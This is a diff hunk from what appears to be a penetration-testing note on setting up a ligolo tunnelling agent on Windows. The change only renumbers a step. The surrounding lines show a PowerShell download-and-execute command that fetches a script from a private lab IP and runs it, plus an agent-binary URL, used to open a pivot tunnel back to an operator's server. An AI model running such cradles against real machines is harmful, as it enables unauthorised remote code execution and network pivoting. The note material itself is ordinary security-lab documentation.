@@ -35,7 +35,7 @@ If you are in 32bit process, run: `%windir%\sysnative\WindowsPowerShell\v1.0\pow
 
 - `$url = "http://192.168.45.168/agent.bin" # CHANGE ME`
 
-Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
+4. Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
 
 Finally you should see an agent connected to your ligolo server.
 
